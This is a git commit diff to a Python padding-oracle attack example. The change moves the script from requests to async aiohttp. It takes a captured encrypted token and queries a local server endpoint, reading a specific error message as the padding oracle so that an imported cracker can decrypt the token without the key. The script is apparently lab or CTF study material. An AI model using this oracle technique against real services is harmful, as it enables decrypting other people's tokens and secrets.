5369d9b00cd233c2f74e4f18303757cd6b5b2f0e
Lordfirespeed <28568841+Lordfirespeed@users.noreply.github.com>
2025-03-06 03:17:35 +0000

    feat: 'padding gambit' using aiohttp

--- src/examples/padding_oracle_crack/requests_example.py
+++ src/examples/padding_oracle_crack/requests_example.py
@@ -11,37 +11,46 @@ of the provided token, it could be used to construct a 'padding oracle' which wo
 decryption of the 'token' without knowledge of the encryption secret.
 """
 
+import asyncio
 import base64
 from urllib.parse import unquote_plus as urlunquote, quote_plus as urlquote
 
-import requests
+import aiohttp
 
 from utils.padding_oracle_crack import PaddingOracleCracker
 
 
-my_token_base64 = urlunquote("fCHta4KM9gOTBkQCGinmuuogytHDRrl%2F7g032l7VSOrVeH939p04HWFrP9Jrf%2B4CInfqkWjX1d8rS8o0HXP4rQ%3D%3D")
+my_token_base64 = urlunquote("a3PAFqNuoigx6YYRniizTwO1KsBXSgS%2BsTZsGx%2FlP7uLOHLXFJSk%2BbzcRkx7%2BYheNcgUoj24Xlnr5WAUTsVoGg%3D%3D")
 my_token = base64.b64decode(my_token_base64)
 iv, ciphertext = bytearray(my_token[:16]), bytearray(my_token[16:])
 
 
-def try_token(iv: bytes, ciphertext: bytes) -> bool:
+async def try_token(session: aiohttp.ClientSession, iv: bytes, ciphertext: bytes) -> bool:
     token_base64 = base64.b64encode(iv + ciphertext).decode("utf-8")
     token_base64_urlencoded = urlquote(token_base64)
-    response = requests.post(f"http://localhost:3000/api/submit/{token_base64_urlencoded}")
-    body = response.json()
+    response = await session.post(f"http://localhost:3000/api/submit/{token_base64_urlencoded}")
+    body = await response.json()
     if body["error"] == 'Missing code in request body':
         return True
     return False
 
 
-assert try_token(iv, ciphertext)
+async def sanity_check():
+    async with aiohttp.ClientSession() as session:
+        assert await try_token(session, iv, ciphertext)
 
 
-def main():
-    cracker = PaddingOracleCracker(iv, ciphertext, try_token)
-    plaintext = cracker.crack_plaintext()
+asyncio.run(sanity_check())
+
+
+async def main():
+    async with aiohttp.ClientSession() as session:
+        async def oracle(iv: bytes, ciphertext: bytes) -> bool:
+            return await try_token(session, iv, ciphertext)
+        cracker = PaddingOracleCracker(iv, ciphertext, oracle)
+        plaintext = await cracker.crack_plaintext()
     print(plaintext.decode("utf-8"))
 
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
